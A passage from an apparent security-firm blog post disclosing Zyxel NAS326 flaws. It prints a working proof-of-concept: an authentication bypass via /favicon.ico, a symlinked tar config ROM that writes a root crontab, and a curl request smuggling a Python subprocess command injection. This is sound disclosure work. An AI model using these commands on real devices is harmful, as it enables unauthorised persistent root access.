#ECEFF4">]</span><span style="color: #D8DEE9FF"> -m </span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">modelnum</span><span style="color: #81A1C1">&gt;</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-h</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">display</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">this</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">help</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">and</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">exit</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-b</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">big</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">endian,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">default</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">is</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">little</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">endian.</span></span>
<span class="line"><span style="color: #D8DEE9FF">              </span><span style="color: #88C0D0">It</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">means</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">the</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">type</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">of</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">working</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">machine</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">which</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">this</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">program</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">runs</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">on,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">not</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">the</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">output</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">type.</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-f</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">fast</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">mode,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">only</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">count</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">checksum,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">no</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">header</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">added</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-q</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">quiet</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">mode,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">only</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">print</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">out</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">checksum</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">instead</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">of</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">other</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">user-friendly</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">messages</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-e</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">write</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">a</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">string</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">within</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">15</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">characters</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">to</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">header</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-t</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">ROM</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">image</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">type,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">integer</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">value</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-i</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">input</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">filename</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-o</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">output</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">filename</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">-m</span><span style="color: #D8DEE9FF">          </span><span style="color: #A3BE8C">Model</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">Number,</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">2</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">byte</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">hex</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">value</span></span></code></pre></div>



<h4 class="wp-block-heading" id="h-file-upload-cgi">file_upload-cgi</h4>



<p>Now that we know how to create our custom backup files, let’s dig into how they are restored on the target. Restoring configs is done at “/desktop,/cgi-bin/file_upload-cgi&#8221;, and a quick test by appending our favorite authentication bypass (appending /favicon.ico to the path) shows that we can bypass authentication once again &#8211; since the binary forgets to validate us.</p>



<p>Decompiling file_upload-cgi &nbsp;and digging around tells us that it simply converts the custom ROM back into a “tgz” using a “bin2ram” utility, which is the reverse of “ram2bin” used when exporting. The export process checks that the model ID stored in the file matches that of the targeted device, and that the ROM image type is equal to 9. If these two checks pass it will set up the “tgz” file for installation the next time the NAS boots.</p>



<p>The file is unpacked in ”/etc/zyxel”, and directory traversals (”..”) are removed. However, looking at the “tar” utility installed on the device leads us to suspect that it’s affected by CVE-2011-5325 , which would let us embed a soft link in the file, which can be used to escape “/etc/zyxel”.</p>



<p>An attacker needs to know what model ID matches the device, but this seems like a rather simple enumeration to perform – or it could be brute-forced.. The NAS326 device on which all this has been tested had the ID “B303”.</p>



<p>Putting all of this together, we come up with the following PoC.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="mkdir -p exploit_dir/exploit
ln -s /var/spool/cron/crontabs/ exploit_dir/exploit/link
CONTENTS=&quot;* * * * * /bin/dsrv-mon.sh &gt; /dev/null 2&gt;&amp;1
17 */2 * * * /bin/rbm.sh by_crond &gt; /dev/null 2&gt;&amp;1
30 01 * * * /bin/backup_webdav_accesslog.sh &gt; /dev/null 2&gt;&amp;1
#*/10 * * * * /usr/bin/ipcam &gt; /dev/null 2&gt;&amp;1
54 18 12 * * /bin/zyfw_downloader ftp://ftp2.Zyxel.com/NAS326/firmware FW_INFO.tgz 0 1 &gt; /dev/null 2&gt;&amp;1
54 18 27 * * /bin/zyfw_downloader ftp://ftp2.Zyxel.com/NAS326/firmware FW_INFO.tgz 0 1 &gt; /dev/null 2&gt;&amp;1
31 12 * * * /sbin/ntpdate_sync.sh &gt; /dev/null 2&gt;&amp;1
31 0 * * * /sbin/ntpdate_sync.sh &gt; /dev/null 2&gt;&amp;1
29 12 12 */1 * /bin/query_pkglst.sh &gt; /dev/null 2&gt;&amp;1
00 0 2 * * /usr/bin/syslogng_filemgmt.sh &gt; /dev/null 2&gt;&amp;1
* * * * * /usr/bin/syslogng_filemgmt.sh 512000 &gt; /dev/null 2&gt;&amp;1
#Six Hours Check
* */6 * * * /usr/bin/python /usr/local/apache/web_framework/portal/MZCA_Auto_Install.pyc
31 12 12 * * /usr/sbin/dst.sh update CET &gt; /dev/null 2&gt;&amp;1
*/1 * * * * /bin/touch /tmp/pwned
&quot;
echo -ne &quot;$CONTENTS&quot; &gt; ./root
# Create the tar, point ./root to whatever ./exploit/link is pointing to. Note this does not work with busybox tar, but busybox does unpack it the way we want it to
tar --transform='s!root!./exploit/link/root!' --no-recursion -cvzf ./magic.tar.gz exploit/link root 1&gt;/dev/null
# Now convert it into a valid ROM file and send it. Either do this on the NAS, or use the dumped ram2bin executable locally.
ram2bin -i ./magic.tar.gz -o malicious_config.rom -e &quot;1.1&quot; -t 9 -m B303
 
# We have the malicious config. Either trick your victim into uploading it, or do it yourself.
curl --request POST \
  --url 'http://192.168.0.103/desktop,/cgi-bin/file_upload-cgi/favicon.ico' \
  --header 'Content-Type: multipart/form-data' \
  --header 'User-Agent: insomnia/2023.5.8' \
  --form return_errno=ZLD \
  --form return_errmsg= \
  --form file_type=config \
  --form file_path=&quot;@./malicious_config.rom&quot;
  
# Done. Now we either wait until they restart and they will have created the file &quot;/tmp/pwned&quot; once per minute, or restart them using the command injection.
curl --request POST \
  --url 'http://192.168.0.103/cmd,/simZysh/register_main/setCookie' \
  --header 'Content-Type: multipart/form-data' \
  --header 'User-Agent: insomnia/2023.5.8' \
  --form 'c0=storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(&quot;subprocess&quot;).check_output(&quot;/usr/local/apache/web_framework/bin/executer_su /sbin/reboot&quot;, shell=True)#'
" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">mkdir</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-p</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">exploit_dir/exploit</span></span>
<span class="line"><span style="color: #88C0D0">ln</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-s</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/var/spool/cron/crontabs/</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">exploit_dir/exploit/link</span></span>
<span class="line"><span style="color: #D8DEE9">CONTENTS</span><span style="color: #81A1C1">=</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">* * * * * /bin/dsrv-mon.sh &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">17 */2 * * * /bin/rbm.sh by_crond &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">30 01 * * * /bin/backup_webdav_accesslog.sh &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">#*/10 * * * * /usr/bin/ipcam &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">54 18 12 * * /bin/zyfw_downloader ftp://ftp2.Zyxel.com/NAS326/firmware FW_INFO.tgz 0 1 &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">54 18 27 * * /bin/zyfw_downloader ftp://ftp2.Zyxel.com/NAS326/firmware FW_INFO.tgz 0 1 &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">31 12 * * * /sbin/ntpdate_sync.sh &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">31 0 * * * /sbin/ntpdate_sync.sh &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">29 12 12 */1 * /bin/query_pkglst.sh &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">00 0 2 * * /usr/bin/syslogng_filemgmt.sh &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">* * * * * /usr/bin/syslogng_filemgmt.sh 512000 &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">#Six Hours Check</span></span>
<span class="line"><span style="color: #A3BE8C">* */6 * * * /usr/bin/python /usr/local/apache/web_framework/portal/MZCA_Auto_Install.pyc</span></span>
<span class="line"><span style="color: #A3BE8C">31 12 12 * * /usr/sbin/dst.sh update CET &gt; /dev/null 2&gt;&amp;1</span></span>
<span class="line"><span style="color: #A3BE8C">*/1 * * * * /bin/touch /tmp/pwned</span></span>
<span class="line"><span style="color: #ECEFF4">&quot;</span></span>
<span class="line"><span style="color: #88C0D0">echo</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-ne</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #D8DEE9">$CONTENTS</span><span style="color: #ECEFF4">&quot;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">&gt;</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">./root</span></span>
<span class="line"><span style="color: #616E88"># Create the tar, point ./root to whatever ./exploit/link is pointing to. Note this does not work with busybox tar, but busybox does unpack it the way we want it to</span></span>
<span class="line"><span style="color: #88C0D0">tar</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--transform=</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">s!root!./exploit/link/root!</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--no-recursion</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-cvzf</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">./magic.tar.gz</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">exploit/link</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">root</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">1&gt;</span><span style="color: #A3BE8C">/dev/null</span></span>
<span class="line"><span style="color: #616E88"># Now convert it into a valid ROM file and send it. Either do this on the NAS, or use the dumped ram2bin executable locally.</span></span>
<span class="line"><span style="color: #88C0D0">ram2bin</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-i</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">./magic.tar.gz</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-o</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">malicious_config.rom</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-e</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">1.1</span><span style="color: #ECEFF4">&quot;</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-t</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">9</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-m</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">B303</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #616E88"># We have the malicious config. Either trick your victim into uploading it, or do it yourself.</span></span>
<span class="line"><span style="color: #88C0D0">curl</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--request</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">POST</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--url</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">http://192.168.0.103/desktop,/cgi-bin/file_upload-cgi/favicon.ico</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--header</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">Content-Type: multipart/form-data</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--header</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">User-Agent: insomnia/2023.5.8</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--form</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">return_errno=ZLD</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--form</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">return_errmsg=</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--form</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">file_type=config</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--form</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">file_path=</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">@./malicious_config.rom</span><span style="color: #ECEFF4">&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span></span>
<span class="line"><span style="color: #616E88"># Done. Now we either wait until they restart and they will have created the file &quot;/tmp/pwned&quot; once per minute, or restart them using the command injection.</span></span>
<span class="line"><span style="color: #88C0D0">curl</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--request</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">POST</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--url</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">http://192.168.0.103/cmd,/simZysh/register_main/setCookie</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--header</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">Content-Type: multipart/form-data</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--header</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">User-Agent: insomnia/2023.5.8</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #EBCB8B">\</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #A3BE8C">--form</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">c0=storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(&quot;subprocess&quot;).check_output(&quot;/usr/local/apache/web_framework/bin/executer_su /sbin/reboot&quot;, shell=True)#</span><span style="color: #ECEFF4">&#039;</span></span>
<span class="line"></span></code></pre></div>



<p>With this, we have obtained a persistent foothold on the device through a cronjob.</p>



<h2 class="wp-block-heading" id="h-the-importance-of-security-testing"><span class="ez-toc-section" id="the-importance-of-security-testing"></span>The importance of security testing<span class="ez-toc-section-end"></span></h2>



<p>As always, the underlying security lesson is to ensure you have continuous security testing in place to minimize the impact of such vulnerabilities. In this case, we have walked through multiple routes for an unauthenticated attacker to persistent root access on this family of NAS devices. Of course, it is never a good idea to use home devices for your corporate network. But if you don’t know they exist, you can’t close your security gaps. </p>



<p>Test your applications in real-time for the latest vulnerabilities with <a href="https://outpost24.com/products/web-application-security-testing/">Outpost24’s Pen Testing as a Service (PTaaS) solution</a>. Our highly skilled and experienced pen testers will give you the most accurate view of your vulnerabilities including business logic errors and backdoors that automated scanners missed.</p>



<div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-2 wp-block-buttons-is-layout-flex">
<div class="wp-block-button"><a class="wp-block-button__link wp-element-button" href="https://outpost24.com/products/web-application-security-testing/#request-a-live-demo">Request a live demo</a></div>
</div>



<h2 class="wp-block-heading" id="h-about-ghost-labs"><span class="ez-toc-section" id="about-ghost-labs"></span>About Ghost Labs<span class="ez-toc-section-end"></span></h2>



<p>Ghost Labs is the specialist security unit within Outpost24 working in partnership with our clients to meet their penetration testing needs and objectives. Our experienced Offensive Security team offers enhanced and bespoke&nbsp;<a href="https://outpost24.com/services/penetration-testing/">penetration testing security&nbsp;services</a>&nbsp;such as advanced network penetration testing, (web)application testing, Red Teaming assessments and complex web application exploitation to help organizations have a true picture of their cyber risk. In addition, the Ghost Labs team is an active contributor to the security community with vulnerability research and coordinated responsible disclosure program.</p>



<p>Ghost Labs performs hundreds of successful penetration tests for its customers ranging from global enterprises to SMEs. Our team consists of highly skilled ethical hackers, covering a wide range of advanced testing services to help companies keep up with evolving threats and new technologies. To help businesses drive security maturity and mitigate risks posed by the evolving threat and techniques of the modern-day hacker.</p>



<p><a id="_msocom_1"></a></p>
											<div class="authors-row">
							<h3>About the Author</h3>
															<div class="author-block">
																		<div class="author-block-top">
																					<div class="author-block-image">
												<img width="865" height="875" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort.jpg" class="lazy lazy-hidden attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="" data-srcset="https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort.jpg 865w, https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort-297x300.jpg 297w, https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort-768x777.jpg 768w" sizes="(max-width: 865px) 100vw, 865px" /><noscript><img width="865" height="875" src="https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort.jpg 865w, https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort-297x300.jpg 297w, https://outpost24.com/wp-content/uploads/2024/05/Timothy-Hjort-768x777.jpg 768w" sizes="(max-width: 865px) 100vw, 865px" /></noscript>											</div>
																				<div class="author-container">
											<span class="author-name"><a href="https://outpost24.com/blog/authors/timothy-hjort/">Timothy Hjort</a></span>
											<span class="author-title">Student Intern in Vulnerability Research, Outpost24</span>
										</div>
									</div>
									<div class="author-block-bottom">
										<!-- wp:paragraph -->
<p>I entered the computer security field due to hollywood movies (HACKERS) and youtube videos before proceeding to study for a master of science in engineering: computer security at Blekinge Institute of Technology in 2019 and as of May 8th 2024 I am currently finishing my thesis there. </p>
<!-- /wp:paragraph -->									</div>
								</div>
													</div>
									</div>
			</div>
		</article>
	</div>
	</main>

<footer class="footer">
	<div class="footer-main">
	  <div class="container">
	    <div class="footer-widget-main">
		  <div id="block-20" class="widget widget_block"><figure class="wp-block-image size-full is-resized"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2024/12/03-o24-color-n.svg" alt="" class="lazy lazy-hidden wp-image-12" style="width:300px"/><noscript><img decoding="async" src="https://outpost24.com/wp-content/uploads/2024/12/03-o24-color-n.svg" alt="" class="wp-image-12" style="width:300px"/></noscript></figure></div><div id="block-12" class="widget widget_block"><a href="/contact/" class="primary-button dark">Contact Us</a></div><div id="block-13" class="widget widget_block">
<div class="wp-block-columns is-layout-flex wp-container-core-columns-is-layout-1 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow">
<h4 class="wp-block-heading has-white-color has-text-color">Follow Us</h4>



<figure style="float:left;margin-right:12px;width: 48px;height: 48px;" class="wp-block-image size-full is-resized">
	<a href="https://www.linkedin.com/company/outpost24" aria-label="link to Outpost24 Linkedin">
		<img loading="lazy" decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2023/05/Social_Linkedin.webp" alt="Linkedin icon" class="lazy lazy-hidden wp-image-3631" width="30" height="30" /><noscript><img loading="lazy" decoding="async" src="https://outpost24.com/wp-content/uploads/2023/05/Social_Linkedin.webp" alt="Linkedin icon" class="wp-image-3631" width="30" height="30" /></noscript>
	</a>
</figure>

<figure style="float:left;margin-right:12px;width: 48px;height: 48px;" class="wp-block-image size-full is-resized">
	<a href="https://www.twitter.com/outpost24" aria-label="link to Outpost24 X/Twitter">
		<img loading="lazy" decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2023/12/x-social-media-white-round-icon.webp" alt="X/Twitter icon" class="lazy lazy-hidden wp-image-3631" width="30" height="30" /><noscript><img loading="lazy" decoding="async" src="https://outpost24.com/wp-content/uploads/2023/12/x-social-media-white-round-icon.webp" alt="X/Twitter icon" class="wp-image-3631" width="30" height="30" /></noscript>
	</a>
</figure>

<figure style="float:left;margin-right:12px;width: 48px;height: 48px;" class="wp-block-image size-full is-resized">
	<a href="https://www.youtube.com/user/Outpost24HQ" aria-label="link to Outpost24 Youtube">
		<img loading="lazy" decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2023/05/Social_Youtube.webp" alt="Youtube icon" class="lazy lazy-hidden wp-image-3631" width="30" height="30" /><noscript><img loading="lazy" decoding="async" src="https://outpost24.com/wp-content/uploads/2023/05/Social_Youtube.webp" alt="Youtube icon" class="wp-image-3631" width="30" height="30" /></noscript>
	</a>
</figure>

<figure style="float:left;margin-right:12px;width: 48px;height: 48px;" class="wp-block-image size-full is-resized">
	<a href="https://github.com/Outpost24" aria-label="link to Outpost24 Github">
		<img loading="lazy" decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2023/05/Social_Github.webp" alt="Github icon" class="lazy lazy-hidden wp-image-3631" width="30" height="30" /><noscript><img loading="lazy" decoding="async" src="https://outpost24.com/wp-content/uploads/2023/05/Social_Github.webp" alt="Github icon" class="wp-image-3631" width="30" height="30" /></noscript>
	</a>
</figure>
</div>
</div>
</div>		</div>
		<div class="footer-widget-one">
		  <div id="block-10" class="widget widget_block">
<h4 class="wp-block-heading has-white-color has-text-color">PRODUCTS</h4>
</div><div id="nav_menu-2" class="widget widget_nav_menu"><div class="menu-footer-1-container"><ul id="menu-footer-1" class="menu"><li id="menu-item-2579" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2579"><a href="https://outpost24.com/pricing/" aria-label="menu link to Pricing">Pricing</a></li>
<li id="menu-item-2580" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2580"><a href="https://outpost24.com/products/risk-based-vulnerability-management/" aria-label="menu link to Outscan NX">Outscan NX</a></li>
<li id="menu-item-2581" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2581"><a href="https://outpost24.com/products/web-application-security-testing/" aria-label="menu link to SWAT">SWAT</a></li>
<li id="menu-item-2582" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2582"><a href="https://outpost24.com/products/cyber-threat-intelligence/" aria-label="menu link to Threat Compass">Threat Compass</a></li>
<li id="menu-item-3402" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3402"><a href="https://outpost24.com/products/external-attack-surface-management/" aria-label="menu link to Sweepatic">Sweepatic</a>
<ul class="sub-menu">
	<li id="menu-item-7337" class="margin-left--sm menu-item menu-item-type-custom menu-item-object-custom menu-item-7337"><a href="https://platform.sweepatic.com/" aria-label="menu link to Sweepatic platform">Sweepatic platform</a></li>
</ul>
</li>
<li id="menu-item-2590" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2590"><a href="https://specopssoft.com/?utm_source=outpost24&#038;utm_medium=referral&#038;utm_campaign=global_outpost24&#038;utm_content=navigation" aria-label="menu link to Specops Software (an Outpost24 company)">Specops Software (an Outpost24 company)</a></li>
</ul></div></div>		</div>
		<div class="footer-widget-two">
		  <div id="block-8" class="widget widget_block">
<h4 class="wp-block-heading has-white-color has-text-color">ABOUT US</h4>
